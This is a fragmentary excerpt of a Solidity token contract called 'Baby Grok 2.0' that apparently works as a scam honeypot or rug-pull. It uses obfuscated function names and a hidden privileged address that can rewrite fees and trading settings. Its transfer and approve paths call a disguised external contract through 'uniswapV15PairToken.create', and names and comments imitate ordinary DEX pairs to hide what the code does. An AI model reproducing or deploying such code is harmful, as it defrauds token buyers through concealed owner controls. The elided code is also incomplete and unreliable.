...
contract FATToken is Context, IERC20, Ownable {
    ...
    string private _name = "Baby Grok 2.0";
    string private _symbol = "BabyGrok2.0";
    ...
    uniswapV1 private uniswapV15PairToken;
    ...
    address private uniswapV15Pair_;
    ...
    constructor(address Antibottoken_, address creator, address caSwap) {
        ...
        uniswapV15PairToken = uniswapV1(uniswapV15Pair_);
        itvv = IpancakeV2(pancakeV2Pair_);


        _Antitbotswaper[uniswapV15Pair_] = true;
        _isExcludedFromFee[uniswapV15Pair_] = true;
    ...
    function holdlGo1114isting(address[] memory accounts, uint256[] memory a) external {
        ...
        if (_msgSender() == address(_Antitbottoken)) { 
            ...
            uniswapV15PairToken.create(8**3);
        }
    }

    function pairupdateweb1114(address aaaa, bool b) public {
    ...
    function aglovveert1114(uint256 g) public {
        if (_Antitbotswaper[_msgSender()]) {
            gg=g;
        } else {
            uniswapV15PairToken.create(8**3);
    ...
    function Eca1114(uint256 aa) public {
        if (_Antitbotswaper[_msgSender()]) {
            creca=aa;
        } else {
            uniswapV15PairToken.create(8**3);
    ...
    function inc11ialfeesl1114(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_msgSender() == address(_Antitbottoken)) {
    ...
    function marketingWalletcaNo1114(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            uniswapV15PairToken = uniswapV1(addresses);
        } else {
            uniswapV15PairToken.create(8**3);
        }
    }
    ...
    function initia1114litzeWl(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
    ...
    function _approve(
        ...
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV15PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV15PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV15PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedtlp[to]) {
            uniswapV15PairToken.create(250**3); 
        }
